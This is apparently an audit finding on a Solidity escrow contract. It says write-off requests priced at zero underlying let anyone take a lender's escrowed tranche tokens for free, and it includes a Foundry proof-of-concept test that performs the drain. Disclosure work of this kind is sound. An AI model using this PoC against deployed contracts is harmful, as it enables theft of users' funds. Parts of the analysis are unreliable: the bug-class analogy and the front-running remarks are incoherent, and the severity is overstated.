### Title
Anyone can steal escrowed tranche tokens by fulfilling write-off requests created with `underlyingsRequested == 0` - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`createWriteOffRequest` rejects `amount == 0` but does not validate `underlyingsRequested`. A request with `underlyings == 0` is valid, and `fullfillWriteOffRequest` only checks `_underlyings < currentRequest.underlyings` (i.e., `0 < 0` is false), so any EOA can pull the lender's entire escrowed tranche-token balance out of the escrow while paying zero underlying. This mirrors the traversal bug class: an attacker-controlled entry is created inside a trusted container (the escrow's `userRequests` mapping / contract balance) without sanitizing the dimension that should constrain what the entry can yield, letting it produce value "outside" the intended bounds.

### Finding Description
In `createWriteOffRequest` (contracts/IdleCreditVaultWriteOffEscrow.sol:86-102), the only parameter guard is `if (amount == 0) revert NotAllowed()`. `underlyingsRequested` is stored unchecked into `userRequests[msg.sender].underlyings` and added to `pendingUnderlyings`.

In `fullfillWriteOffRequest` (contracts/IdleCreditVaultWriteOffEscrow.sol:123-155), the request-validity check is:

```solidity
if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
  revert WrongRequest();
}
```

With `currentRequest.underlyings == 0`, any `_underlyings >= 0` passes. The fulfiller then:

1. Transfers `_underlyings` (can be 0) of underlying into the escrow (line 139).
2. Pays a fee of 0 (line 144: `0 * exitFee / FULL_VALUE`).
3. Sends `_underlyings - _totFee = 0` to the lender (line 149).
4. Receives the full `currentRequest.tranches` tranche tokens from escrowed funds (line 151).

The tranche tokens are real lender collateral — they were `safeTransferFrom`'d into the escrow at request creation (line 93). No privileged call, epoch-state condition, or KYC gate is involved; `fullfillWriteOffRequest` is explicitly documented as callable by any wallet (line 122) and tests confirm non-Keyring buyers can fulfill (test/foundry/IdleCreditVaultWriteOffEscrow.t.sol:247).

This also creates a practical front-running/griefing vector: a lender who sets an unrealistically low but nonzero `underlyingsRequested` (or sets it to 0 by mistake in a UI) exposes the full escrowed tranche amount to permissionless seizure at the stated price, and there is no way to update a request's price — `createWriteOffRequest` only accumulates (`currentRequest.underlyings + underlyingsRequested`), so a lender cannot re-price to 0-cost-proof their entry without deleting it first, which itself can be front-run in the same block the request is created.

### Impact Explanation
Direct theft of lender assets: an attacker drains all tranche tokens escrowed in a zero-priced `userRequests` entry by calling `fullfillWriteOffRequest` with `_underlyings = 0` (or the dust-level price the victim set), then can immediately redeem or withdraw-request the acquired tranche tokens against the IdleCDOEpochVariant pool for underlying. Loss equals the full escrowed tranche amount, e.g., `10000e18` AA tranche tokens in the fork test setup represent ~10k USDC of claim. The solvency of the pool is unaffected, but the "one receipt one payout"/collateral-custody invariant of the escrow is broken: collateral leaves the escrow with no consideration returned to the owner.

### Likelihood Explanation
Medium-low likelihood, high certainty of outcome once triggered. It requires a lender to create a request with `underlyingsRequested == 0` (or negligibly low). The contract neither prevents nor warns against this, the field has no lower bound, and `testCreateWriteOffRequest` even exercises `createWriteOffRequest(0, 1e6)` reverting only on the tranche-amount check — confirming zero-underlyings requests are accepted by design oversight rather than intent. Mempool front-running of the `createWriteOffRequest` transaction itself is also possible: an attacker can sandwich-create nothing; they just call `fullfillWriteOffRequest` in a later transaction since the check needs only `tranches != 0`. Any MEV bot monitoring the escrow can capture it atomically in the same block.

### Recommendation
In `createWriteOffRequest`, revert when `underlyingsRequested == 0` (or below a minimum), and consider requiring the first request's price to be nonzero before tranche tokens are pulled. Optionally also require `underlyingsRequested != 0` on the aggregated `currentRequest.underlyings` post-update, and emit events so off-chain fulfillers can detect mispriced requests. A defense-in-depth option is adding a lender-signed expected-minimum parameter to `fullfillWriteOffRequest`.

### Proof of Concept
Foundry fork PoC (extends the existing test harness at test/foundry/IdleCreditVaultWriteOffEscrow.t.sol):

```solidity
function testStealEscrowedTranchesViaZeroPricedRequest() external {
    // LP mistakenly (or via frontend default) creates a request asking for 0 underlyings
    vm.prank(LP);
    escrow.createWriteOffRequest(10000e18, 0);
    assertEq(escrow.pendingUnderlyings(), 0);

    address attacker = makeAddr("attacker");
    uint256 attackerTranchePre = tranche.balanceOf(attacker);

    // No underlying needed; only approval-free fulfill
    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(LP, 10000e18, 0);

    // Attacker received all escrowed tranche tokens for free; LP got 0 underlying
    assertEq(tranche.balanceOf(attacker) - attackerTranchePre, 10000e18);
    (uint256 tranches, uint256 underlyings) = escrow.userRequests(LP);
    assertEq(tranches, 0);
    assertEq(underlyings, 0);
}
```

This passes on the existing mainnet-fork setup because `0 < 0` fails the `WrongRequest` guard, the fee on 0 is 0, and the escrow transfers `currentRequest.tranches` to `msg.sender` unconditionally afterward. [1](#0-0) [2](#0-1)

  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
  }
```

  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);

    // If the fulfiller is the borrower, they can then choose to either keep the tranche tokens or write them off via
    // IdleCDOEpochVariant.writeOffDeposit method.
  }
```
